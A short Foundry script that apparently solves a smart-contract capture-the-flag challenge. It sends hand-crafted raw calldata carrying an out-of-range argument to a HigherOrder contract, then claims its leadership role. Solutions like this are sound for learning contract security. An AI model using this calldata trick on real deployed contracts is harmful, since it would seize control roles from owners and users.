// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/HigherOrder.sol";

contract HigherOrderSolution is Script {
    HigherOrder higherOrder = HigherOrder(0x4C67A5D485570F38670357be0AeaE73664bffc0a);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes memory dataToCall = hex"211c85ab0000000000000000000000000000000000000000000000000000000000000100";
        console.logBytes(dataToCall);
        address(higherOrder).call(dataToCall);
        higherOrder.claimLeadership();
        console.log(higherOrder.commander());
        vm.stopBroadcast();
    }
}
